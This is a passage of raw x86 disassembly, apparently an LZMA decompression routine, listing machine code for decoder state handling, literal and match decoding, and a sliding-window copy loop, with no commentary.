  4081a5:	4a                   	dec    %edx
  4081a6:	89 55 e0             	mov    %edx,-0x20(%ebp)
  4081a9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4081ac:	8b 10                	mov    (%eax),%edx
  4081ae:	89 55 dc             	mov    %edx,-0x24(%ebp)
  4081b1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4081b4:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4081b7:	8b 70 34             	mov    0x34(%eax),%esi
  4081ba:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4081bd:	8b 59 44             	mov    0x44(%ecx),%ebx
  4081c0:	8b 50 38             	mov    0x38(%eax),%edx
  4081c3:	89 55 d8             	mov    %edx,-0x28(%ebp)
  4081c6:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4081c9:	8b 41 3c             	mov    0x3c(%ecx),%eax
  4081cc:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4081cf:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4081d2:	8b 4a 40             	mov    0x40(%edx),%ecx
  4081d5:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  4081d8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4081db:	8b 50 48             	mov    0x48(%eax),%edx
  4081de:	89 55 cc             	mov    %edx,-0x34(%ebp)
  4081e1:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4081e4:	8b 41 2c             	mov    0x2c(%ecx),%eax
  4081e7:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4081ea:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4081ed:	8b 4a 30             	mov    0x30(%edx),%ecx
  4081f0:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  4081f3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4081f6:	8b 50 1c             	mov    0x1c(%eax),%edx
  4081f9:	89 55 c0             	mov    %edx,-0x40(%ebp)
  4081fc:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4081ff:	8b 41 0c             	mov    0xc(%ecx),%eax
  408202:	89 45 bc             	mov    %eax,-0x44(%ebp)
  408205:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408208:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40820b:	8b 7a 28             	mov    0x28(%edx),%edi
  40820e:	8b 50 20             	mov    0x20(%eax),%edx
  408211:	89 55 84             	mov    %edx,-0x7c(%ebp)
  408214:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408217:	8b 41 24             	mov    0x24(%ecx),%eax
  40821a:	89 45 88             	mov    %eax,-0x78(%ebp)
  40821d:	8b 55 f8             	mov    -0x8(%ebp),%edx
  408220:	89 55 8c             	mov    %edx,-0x74(%ebp)
  408223:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408226:	8b 41 14             	mov    0x14(%ecx),%eax
  408229:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
  40822f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408232:	8b 4a 18             	mov    0x18(%edx),%ecx
  408235:	33 d2                	xor    %edx,%edx
  408237:	89 4d 80             	mov    %ecx,-0x80(%ebp)
  40823a:	8b 45 08             	mov    0x8(%ebp),%eax
  40823d:	89 10                	mov    %edx,(%eax)
  40823f:	83 7d cc ff          	cmpl   $0xffffffff,-0x34(%ebp)
  408243:	75 07                	jne    0x40824c
  408245:	33 c0                	xor    %eax,%eax
  408247:	e9 a9 05 00 00       	jmp    0x4087f5
  40824c:	83 7d bc 00          	cmpl   $0x0,-0x44(%ebp)
  408250:	75 16                	jne    0x408268
  408252:	8d 55 b8             	lea    -0x48(%ebp),%edx
  408255:	89 55 c0             	mov    %edx,-0x40(%ebp)
  408258:	c7 45 bc 01 00 00 00 	movl   $0x1,-0x44(%ebp)
  40825f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408262:	8a 41 4c             	mov    0x4c(%ecx),%al
  408265:	88 45 b8             	mov    %al,-0x48(%ebp)
  408268:	83 7d cc fe          	cmpl   $0xfffffffe,-0x34(%ebp)
  40826c:	0f 85 9b 00 00 00    	jne    0x40830d
  408272:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408275:	b8 00 03 00 00       	mov    $0x300,%eax
  40827a:	8b 4a 04             	mov    0x4(%edx),%ecx
  40827d:	33 d2                	xor    %edx,%edx
  40827f:	03 4d dc             	add    -0x24(%ebp),%ecx
  408282:	d3 e0                	shl    %cl,%eax
  408284:	05 36 07 00 00       	add    $0x736,%eax
  408289:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  40828c:	89 55 b0             	mov    %edx,-0x50(%ebp)
  40828f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  408292:	8b c1                	mov    %ecx,%eax
  408294:	89 45 98             	mov    %eax,-0x68(%ebp)
  408297:	8b 55 b0             	mov    -0x50(%ebp),%edx
  40829a:	3b 55 b4             	cmp    -0x4c(%ebp),%edx
  40829d:	73 17                	jae    0x4082b6
  40829f:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  4082a2:	66 c7 01 00 04       	movw   $0x400,(%ecx)
  4082a7:	ff 45 b0             	incl   -0x50(%ebp)
  4082aa:	83 45 98 02          	addl   $0x2,-0x68(%ebp)
  4082ae:	8b 45 b0             	mov    -0x50(%ebp),%eax
  4082b1:	3b 45 b4             	cmp    -0x4c(%ebp),%eax
  4082b4:	72 e9                	jb     0x40829f
  4082b6:	ba 01 00 00 00       	mov    $0x1,%edx
  4082bb:	33 c0                	xor    %eax,%eax
  4082bd:	89 55 d0             	mov    %edx,-0x30(%ebp)
  4082c0:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  4082c3:	89 55 d8             	mov    %edx,-0x28(%ebp)
  4082c6:	8b f2                	mov    %edx,%esi
  4082c8:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4082cb:	33 d2                	xor    %edx,%edx
  4082cd:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  4082d0:	33 db                	xor    %ebx,%ebx
  4082d2:	8b 55 bc             	mov    -0x44(%ebp),%edx
  4082d5:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4082d8:	33 ff                	xor    %edi,%edi
  4082da:	c6 44 10 ff 00       	movb   $0x0,-0x1(%eax,%edx,1)
  4082df:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  4082e5:	e8 32 fb ff ff       	call   0x407e1c
  4082ea:	83 7d 90 00          	cmpl   $0x0,-0x70(%ebp)
  4082ee:	74 08                	je     0x4082f8
  4082f0:	8b 45 90             	mov    -0x70(%ebp),%eax
  4082f3:	e9 fd 04 00 00       	jmp    0x4087f5
  4082f8:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4082fc:	74 0a                	je     0x408308
  4082fe:	b8 01 00 00 00       	mov    $0x1,%eax
  408303:	e9 ed 04 00 00       	jmp    0x4087f5
  408308:	33 d2                	xor    %edx,%edx
  40830a:	89 55 cc             	mov    %edx,-0x34(%ebp)
  40830d:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  408310:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408313:	8d 14 01             	lea    (%ecx,%eax,1),%edx
  408316:	89 55 98             	mov    %edx,-0x68(%ebp)
  408319:	eb 30                	jmp    0x40834b
  40831b:	8b c7                	mov    %edi,%eax
  40831d:	2b c6                	sub    %esi,%eax
  40831f:	3b 45 bc             	cmp    -0x44(%ebp),%eax
  408322:	72 03                	jb     0x408327
  408324:	03 45 bc             	add    -0x44(%ebp),%eax
  408327:	8b 55 c0             	mov    -0x40(%ebp),%edx
  40832a:	8a 04 02             	mov    (%edx,%eax,1),%al
  40832d:	50                   	push   %eax
  40832e:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  408331:	58                   	pop    %eax
  408332:	88 04 39             	mov    %al,(%ecx,%edi,1)
  408335:	8b 55 98             	mov    -0x68(%ebp),%edx
  408338:	88 02                	mov    %al,(%edx)
  40833a:	ff 45 ec             	incl   -0x14(%ebp)
  40833d:	ff 45 98             	incl   -0x68(%ebp)
  408340:	47                   	inc    %edi
  408341:	3b 7d bc             	cmp    -0x44(%ebp),%edi
  408344:	75 02                	jne    0x408348
  408346:	33 ff                	xor    %edi,%edi
  408348:	ff 4d cc             	decl   -0x34(%ebp)
  40834b:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  40834f:	74 08                	je     0x408359
  408351:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408354:	3b 45 0c             	cmp    0xc(%ebp),%eax
  408357:	72 c2                	jb     0x40831b
  408359:	85 ff                	test   %edi,%edi
  40835b:	75 0f                	jne    0x40836c
  40835d:	8b 55 c0             	mov    -0x40(%ebp),%edx
  408360:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  408363:	8a 44 0a ff          	mov    -0x1(%edx,%ecx,1),%al
  408367:	88 45 eb             	mov    %al,-0x15(%ebp)
  40836a:	eb 0a                	jmp    0x408376
  40836c:	8b 55 c0             	mov    -0x40(%ebp),%edx
  40836f:	8a 4c 3a ff          	mov    -0x1(%edx,%edi,1),%cl
  408373:	88 4d eb             	mov    %cl,-0x15(%ebp)
  408376:	33 c0                	xor    %eax,%eax
  408378:	33 d2                	xor    %edx,%edx
  40837a:	89 45 90             	mov    %eax,-0x70(%ebp)
  40837d:	89 55 94             	mov    %edx,-0x6c(%ebp)
  408380:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  408383:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408386:	8d 14 01             	lea    (%ecx,%eax,1),%edx
  408389:	89 55 98             	mov    %edx,-0x68(%ebp)
  40838c:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40838f:	3b 4d 0c             	cmp    0xc(%ebp),%ecx
  408392:	0f 83 d8 03 00 00    	jae    0x408770
  408398:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40839b:	03 45 c8             	add    -0x38(%ebp),%eax
  40839e:	23 45 e4             	and    -0x1c(%ebp),%eax
  4083a1:	89 45 ac             	mov    %eax,-0x54(%ebp)
  4083a4:	83 7d 90 00          	cmpl   $0x0,-0x70(%ebp)
  4083a8:	74 08                	je     0x4083b2
  4083aa:	8b 45 90             	mov    -0x70(%ebp),%eax
  4083ad:	e9 43 04 00 00       	jmp    0x4087f5
  4083b2:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4083b6:	74 0a                	je     0x4083c2
  4083b8:	b8 01 00 00 00       	mov    $0x1,%eax
  4083bd:	e9 33 04 00 00       	jmp    0x4087f5
  4083c2:	8b c3                	mov    %ebx,%eax
  4083c4:	8b 55 ac             	mov    -0x54(%ebp),%edx
  4083c7:	c1 e0 04             	shl    $0x4,%eax
  4083ca:	03 d2                	add    %edx,%edx
  4083cc:	03 c0                	add    %eax,%eax
  4083ce:	03 45 f0             	add    -0x10(%ebp),%eax
  4083d1:	03 c2                	add    %edx,%eax
  4083d3:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  4083d9:	e8 de fa ff ff       	call   0x407ebc
  4083de:	85 c0                	test   %eax,%eax
  4083e0:	0f 85 c1 00 00 00    	jne    0x4084a7
  4083e6:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4083e9:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4083ec:	03 45 c8             	add    -0x38(%ebp),%eax
  4083ef:	33 d2                	xor    %edx,%edx
  4083f1:	23 45 e0             	and    -0x20(%ebp),%eax
  4083f4:	d3 e0                	shl    %cl,%eax
  4083f6:	b9 08 00 00 00       	mov    $0x8,%ecx
  4083fb:	8a 55 eb             	mov    -0x15(%ebp),%dl
  4083fe:	2b 4d dc             	sub    -0x24(%ebp),%ecx
  408401:	d3 fa                	sar    %cl,%edx
  408403:	03 c2                	add    %edx,%eax
  408405:	c1 e0 08             	shl    $0x8,%eax
  408408:	8d 04 40             	lea    (%eax,%eax,2),%eax
  40840b:	03 c0                	add    %eax,%eax
  40840d:	03 45 f0             	add    -0x10(%ebp),%eax
  408410:	05 6c 0e 00 00       	add    $0xe6c,%eax
  408415:	83 fb 07             	cmp    $0x7,%ebx
  408418:	7c 34                	jl     0x40844e
  40841a:	8b d7                	mov    %edi,%edx
  40841c:	2b d6                	sub    %esi,%edx
  40841e:	89 55 a4             	mov    %edx,-0x5c(%ebp)
  408421:	8b 4d a4             	mov    -0x5c(%ebp),%ecx
  408424:	3b 4d bc             	cmp    -0x44(%ebp),%ecx
  408427:	72 06                	jb     0x40842f
  408429:	8b 55 bc             	mov    -0x44(%ebp),%edx
  40842c:	01 55 a4             	add    %edx,-0x5c(%ebp)
  40842f:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  408432:	8b 55 a4             	mov    -0x5c(%ebp),%edx
  408435:	8a 0c 11             	mov    (%ecx,%edx,1),%cl
  408438:	88 4d ab             	mov    %cl,-0x55(%ebp)
  40843b:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  408441:	8a 4d ab             	mov    -0x55(%ebp),%cl
  408444:	e8 af fb ff ff       	call   0x407ff8
  408449:	88 45 eb             	mov    %al,-0x15(%ebp)
  40844c:	eb 0e                	jmp    0x40845c
  40844e:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  408454:	e8 73 fb ff ff       	call   0x407fcc
  408459:	88 45 eb             	mov    %al,-0x15(%ebp)
  40845c:	8b 45 98             	mov    -0x68(%ebp),%eax
  40845f:	8a 4d eb             	mov    -0x15(%ebp),%cl
  408462:	88 08                	mov    %cl,(%eax)
  408464:	ff 45 ec             	incl   -0x14(%ebp)
  408467:	ff 45 98             	incl   -0x68(%ebp)
  40846a:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40846d:	3b 45 bc             	cmp    -0x44(%ebp),%eax
  408470:	73 03                	jae    0x408475
  408472:	ff 45 c4             	incl   -0x3c(%ebp)
  408475:	8b 55 c0             	mov    -0x40(%ebp),%edx
  408478:	8a 4d eb             	mov    -0x15(%ebp),%cl
  40847b:	88 0c 3a             	mov    %cl,(%edx,%edi,1)
  40847e:	47                   	inc    %edi
  40847f:	3b 7d bc             	cmp    -0x44(%ebp),%edi
  408482:	75 02                	jne    0x408486
  408484:	33 ff                	xor    %edi,%edi
  408486:	83 fb 04             	cmp    $0x4,%ebx
  408489:	7d 07                	jge    0x408492
  40848b:	33 db                	xor    %ebx,%ebx
  40848d:	e9 d2 02 00 00       	jmp    0x408764
  408492:	83 fb 0a             	cmp    $0xa,%ebx
  408495:	7d 08                	jge    0x40849f
  408497:	83 eb 03             	sub    $0x3,%ebx
  40849a:	e9 c5 02 00 00       	jmp    0x408764
  40849f:	83 eb 06             	sub    $0x6,%ebx
  4084a2:	e9 bd 02 00 00       	jmp    0x408764
  4084a7:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  4084ad:	8b c3                	mov    %ebx,%eax
  4084af:	03 c0                	add    %eax,%eax
  4084b1:	03 45 f0             	add    -0x10(%ebp),%eax
  4084b4:	05 80 01 00 00       	add    $0x180,%eax
  4084b9:	e8 fe f9 ff ff       	call   0x407ebc
  4084be:	48                   	dec    %eax
  4084bf:	0f 85 37 01 00 00    	jne    0x4085fc
  4084c5:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  4084cb:	8b c3                	mov    %ebx,%eax
  4084cd:	03 c0                	add    %eax,%eax
  4084cf:	03 45 f0             	add    -0x10(%ebp),%eax
  4084d2:	05 98 01 00 00       	add    $0x198,%eax
  4084d7:	e8 e0 f9 ff ff       	call   0x407ebc
  4084dc:	85 c0                	test   %eax,%eax
  4084de:	0f 85 93 00 00 00    	jne    0x408577
  4084e4:	8b c3                	mov    %ebx,%eax
  4084e6:	8b 55 ac             	mov    -0x54(%ebp),%edx
  4084e9:	c1 e0 04             	shl    $0x4,%eax
  4084ec:	03 d2                	add    %edx,%edx
  4084ee:	03 c0                	add    %eax,%eax
  4084f0:	03 45 f0             	add    -0x10(%ebp),%eax
  4084f3:	03 c2                	add    %edx,%eax
  4084f5:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  4084fb:	05 e0 01 00 00       	add    $0x1e0,%eax
  408500:	e8 b7 f9 ff ff       	call   0x407ebc
  408505:	85 c0                	test   %eax,%eax
  408507:	0f 85 be 00 00 00    	jne    0x4085cb
  40850d:	83 7d c4 00          	cmpl   $0x0,-0x3c(%ebp)
  408511:	75 0a                	jne    0x40851d
  408513:	b8 01 00 00 00       	mov    $0x1,%eax
  408518:	e9 d8 02 00 00       	jmp    0x4087f5
  40851d:	83 fb 07             	cmp    $0x7,%ebx
  408520:	7d 07                	jge    0x408529
  408522:	b9 09 00 00 00       	mov    $0x9,%ecx
  408527:	eb 05                	jmp    0x40852e
  408529:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40852e:	8b d9                	mov    %ecx,%ebx
  408530:	8b c7                	mov    %edi,%eax
  408532:	2b c6                	sub    %esi,%eax
  408534:	3b 45 bc             	cmp    -0x44(%ebp),%eax
  408537:	72 03                	jb     0x40853c
  408539:	03 45 bc             	add    -0x44(%ebp),%eax
  40853c:	8b 55 c0             	mov    -0x40(%ebp),%edx
  40853f:	8a 04 02             	mov    (%edx,%eax,1),%al
  408542:	88 45 eb             	mov    %al,-0x15(%ebp)
  408545:	8b 55 c0             	mov    -0x40(%ebp),%edx
  408548:	8a 4d eb             	mov    -0x15(%ebp),%cl
  40854b:	88 0c 3a             	mov    %cl,(%edx,%edi,1)
  40854e:	47                   	inc    %edi
  40854f:	3b 7d bc             	cmp    -0x44(%ebp),%edi
  408552:	75 02                	jne    0x408556
  408554:	33 ff                	xor    %edi,%edi
  408556:	8b 45 98             	mov    -0x68(%ebp),%eax
  408559:	8a 55 eb             	mov    -0x15(%ebp),%dl
  40855c:	88 10                	mov    %dl,(%eax)
  40855e:	ff 45 ec             	incl   -0x14(%ebp)
  408561:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  408564:	3b 4d bc             	cmp    -0x44(%ebp),%ecx
  408567:	0f 83 13 fe ff ff    	jae    0x408380
  40856d:	ff 45 c4             	incl   -0x3c(%ebp)
  408570:	e9 0b fe ff ff       	jmp    0x408380
  408575:	eb 54                	jmp    0x4085cb
  408577:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  40857d:	8b c3                	mov    %ebx,%eax
  40857f:	03 c0                	add    %eax,%eax
  408581:	03 45 f0             	add    -0x10(%ebp),%eax
  408584:	05 b0 01 00 00       	add    $0x1b0,%eax
  408589:	e8 2e f9 ff ff       	call   0x407ebc
  40858e:	85 c0                	test   %eax,%eax
  408590:	75 05                	jne    0x408597
  408592:	8b 45 d8             	mov    -0x28(%ebp),%eax
  408595:	eb 2f                	jmp    0x4085c6
  408597:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  40859d:	8b c3                	mov    %ebx,%eax
  40859f:	03 c0                	add    %eax,%eax
  4085a1:	03 45 f0             	add    -0x10(%ebp),%eax
  4085a4:	05 c8 01 00 00       	add    $0x1c8,%eax
  4085a9:	e8 0e f9 ff ff       	call   0x407ebc
  4085ae:	85 c0                	test   %eax,%eax
  4085b0:	75 05                	jne    0x4085b7
  4085b2:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4085b5:	eb 09                	jmp    0x4085c0
  4085b7:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4085ba:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  4085bd:	89 55 d0             	mov    %edx,-0x30(%ebp)
  4085c0:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4085c3:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  4085c6:	89 75 d8             	mov    %esi,-0x28(%ebp)
  4085c9:	8b f0                	mov    %eax,%esi
  4085cb:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  4085d1:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4085d4:	05 68 0a 00 00       	add    $0xa68,%eax
  4085d9:	8b 4d ac             	mov    -0x54(%ebp),%ecx
  4085dc:	e8 8b fa ff ff       	call   0x40806c
  4085e1:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4085e4:	83 fb 07             	cmp    $0x7,%ebx
  4085e7:	7d 07                	jge    0x4085f0
  4085e9:	b8 08 00 00 00       	mov    $0x8,%eax
  4085ee:	eb 05                	jmp    0x4085f5
  4085f0:	b8 0b 00 00 00       	mov    $0xb,%eax
  4085f5:	8b d8                	mov    %eax,%ebx
  4085f7:	e9 f7 00 00 00       	jmp    0x4086f3
  4085fc:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  4085ff:	89 55 d0             	mov    %edx,-0x30(%ebp)
  408602:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  408605:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  408608:	89 75 d8             	mov    %esi,-0x28(%ebp)
  40860b:	83 fb 07             	cmp    $0x7,%ebx
  40860e:	7d 07                	jge    0x408617
  408610:	b8 07 00 00 00       	mov    $0x7,%eax
  408615:	eb 05                	jmp    0x40861c
  408617:	b8 0a 00 00 00       	mov    $0xa,%eax
  40861c:	8b d8                	mov    %eax,%ebx
  40861e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  408621:	05 64 06 00 00       	add    $0x664,%eax
  408626:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  40862c:	8b 4d ac             	mov    -0x54(%ebp),%ecx
  40862f:	e8 38 fa ff ff       	call   0x40806c
  408634:	89 45 cc             	mov    %eax,-0x34(%ebp)
  408637:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  40863d:	83 7d cc 04          	cmpl   $0x4,-0x34(%ebp)
  408641:	7d 05                	jge    0x408648
  408643:	8b 45 cc             	mov    -0x34(%ebp),%eax
  408646:	eb 05                	jmp    0x40864d
  408648:	b8 03 00 00 00       	mov    $0x3,%eax
  40864d:	c1 e0 06             	shl    $0x6,%eax
  408650:	ba 06 00 00 00       	mov    $0x6,%edx
  408655:	03 c0                	add    %eax,%eax
  408657:	03 45 f0             	add    -0x10(%ebp),%eax
  40865a:	05 60 03 00 00       	add    $0x360,%eax
  40865f:	e8 e0 f8 ff ff       	call   0x407f44
  408664:	89 45 a0             	mov    %eax,-0x60(%ebp)
  408667:	83 7d a0 04          	cmpl   $0x4,-0x60(%ebp)
  40866b:	7c 77                	jl     0x4086e4
  40866d:	8b 4d a0             	mov    -0x60(%ebp),%ecx
  408670:	d1 f9                	sar    $1,%ecx
  408672:	49                   	dec    %ecx
  408673:	89 4d 9c             	mov    %ecx,-0x64(%ebp)
  408676:	8b 4d 9c             	mov    -0x64(%ebp),%ecx
  408679:	8b 75 a0             	mov    -0x60(%ebp),%esi
  40867c:	83 e6 01             	and    $0x1,%esi
  40867f:	83 ce 02             	or     $0x2,%esi
  408682:	d3 e6                	shl    %cl,%esi
  408684:	83 7d a0 0e          	cmpl   $0xe,-0x60(%ebp)
  408688:	7d 28                	jge    0x4086b2
  40868a:	8b c6                	mov    %esi,%eax
  40868c:	8b 55 a0             	mov    -0x60(%ebp),%edx
  40868f:	03 c0                	add    %eax,%eax
  408691:	03 d2                	add    %edx,%edx
  408693:	03 45 f0             	add    -0x10(%ebp),%eax
  408696:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  40869c:	05 60 05 00 00       	add    $0x560,%eax
  4086a1:	2b c2                	sub    %edx,%eax
  4086a3:	8b 55 9c             	mov    -0x64(%ebp),%edx
  4086a6:	83 c0 fe             	add    $0xfffffffe,%eax
  4086a9:	e8 da f8 ff ff       	call   0x407f88
  4086ae:	03 f0                	add    %eax,%esi
  4086b0:	eb 35                	jmp    0x4086e7
  4086b2:	8b 55 9c             	mov    -0x64(%ebp),%edx
  4086b5:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  4086bb:	83 c2 fc             	add    $0xfffffffc,%edx
  4086be:	e8 99 f7 ff ff       	call   0x407e5c
  4086c3:	c1 e0 04             	shl    $0x4,%eax
  4086c6:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  4086cc:	03 f0                	add    %eax,%esi
  4086ce:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4086d1:	05 44 06 00 00       	add    $0x644,%eax
  4086d6:	ba 04 00 00 00       	mov    $0x4,%edx
  4086db:	e8 a8 f8 ff ff       	call   0x407f88
  4086e0:	03 f0                	add    %eax,%esi
  4086e2:	eb 03                	jmp    0x4086e7
  4086e4:	8b 75 a0             	mov    -0x60(%ebp),%esi
  4086e7:	46                   	inc    %esi
  4086e8:	75 09                	jne    0x4086f3
  4086ea:	c7 45 cc ff ff ff ff 	movl   $0xffffffff,-0x34(%ebp)
  4086f1:	eb 7d                	jmp    0x408770
  4086f3:	83 45 cc 02          	addl   $0x2,-0x34(%ebp)
  4086f7:	3b 75 c4             	cmp    -0x3c(%ebp),%esi
  4086fa:	76 0a                	jbe    0x408706
  4086fc:	b8 01 00 00 00       	mov    $0x1,%eax
  408701:	e9 ef 00 00 00       	jmp    0x4087f5
  408706:	8b 55 bc             	mov    -0x44(%ebp),%edx
  408709:	2b 55 c4             	sub    -0x3c(%ebp),%edx
  40870c:	3b 55 cc             	cmp    -0x34(%ebp),%edx
  40870f:	76 08                	jbe    0x408719
  408711:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  408714:	01 4d c4             	add    %ecx,-0x3c(%ebp)
  408717:	eb 06                	jmp    0x40871f
  408719:	8b 45 bc             	mov    -0x44(%ebp),%eax
  40871c:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  40871f:	8b c7                	mov    %edi,%eax
  408721:	2b c6                	sub    %esi,%eax
  408723:	3b 45 bc             	cmp    -0x44(%ebp),%eax
  408726:	72 03                	jb     0x40872b
  408728:	03 45 bc             	add    -0x44(%ebp),%eax
  40872b:	8b 55 c0             	mov    -0x40(%ebp),%edx
  40872e:	8a 0c 02             	mov    (%edx,%eax,1),%cl
  408731:	88 4d eb             	mov    %cl,-0x15(%ebp)
  408734:	8b 45 c0             	mov    -0x40(%ebp),%eax
  408737:	8a 55 eb             	mov    -0x15(%ebp),%dl
  40873a:	88 14 38             	mov    %dl,(%eax,%edi,1)
  40873d:	47                   	inc    %edi
  40873e:	3b 7d bc             	cmp    -0x44(%ebp),%edi
  408741:	75 02                	jne    0x408745
  408743:	33 ff                	xor    %edi,%edi
  408745:	ff 4d cc             	decl   -0x34(%ebp)
  408748:	8b 45 98             	mov    -0x68(%ebp),%eax
  40874b:	8a 55 eb             	mov    -0x15(%ebp),%dl
  40874e:	88 10                	mov    %dl,(%eax)
  408750:	ff 45 ec             	incl   -0x14(%ebp)
  408753:	ff 45 98             	incl   -0x68(%ebp)
  408756:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  40875a:	74 08                	je     0x408764
  40875c:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40875f:	3b 4d 0c             	cmp    0xc(%ebp),%ecx
  408762:	72 bb                	jb     0x40871f
  408764:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408767:	3b 45 0c             	cmp    0xc(%ebp),%eax
  40876a:	0f 82 28 fc ff ff    	jb     0x408398
  408770:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408773:	8b 4d 84             	mov    -0x7c(%ebp),%ecx
  408776:	89 4a 20             	mov    %ecx,0x20(%edx)
  408779:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40877c:	8b 55 88             	mov    -0x78(%ebp),%edx
  40877f:	89 50 24             	mov    %edx,0x24(%eax)
  408782:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408785:	89 79 28             	mov    %edi,0x28(%ecx)
  408788:	8b 45 c8             	mov    -0x38(%ebp),%eax
  40878b:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40878e:	03 45 ec             	add    -0x14(%ebp),%eax
  408791:	89 42 2c             	mov    %eax,0x2c(%edx)
  408794:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408797:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40879a:	89 41 30             	mov    %eax,0x30(%ecx)
  40879d:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4087a0:	89 72 34             	mov    %esi,0x34(%edx)
  4087a3:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4087a6:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4087a9:	89 41 38             	mov    %eax,0x38(%ecx)
  4087ac:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4087af:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4087b2:	89 4a 3c             	mov    %ecx,0x3c(%edx)
  4087b5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4087b8:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4087bb:	89 50 40             	mov    %edx,0x40(%eax)
  4087be:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4087c1:	89 59 44             	mov    %ebx,0x44(%ecx)
  4087c4:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4087c7:	8b 55 cc             	mov    -0x34(%ebp),%edx
  4087ca:	89 50 48             	mov    %edx,0x48(%eax)
  4087cd:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4087d0:	8a 45 b8             	mov    -0x48(%ebp),%al
  4087d3:	88 41 4c             	mov    %al,0x4c(%ecx)
  4087d6:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4087d9:	8b 8d 7c ff ff ff    	mov    -0x84(%ebp),%ecx
  4087df:	89 4a 14             	mov    %ecx,0x14(%edx)
  4087e2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4087e5:	8b 55 80             	mov    -0x80(%ebp),%edx
  4087e8:	89 50 18             	mov    %edx,0x18(%eax)
  4087eb:	8b 4d 08             	mov    0x8(%ebp),%ecx
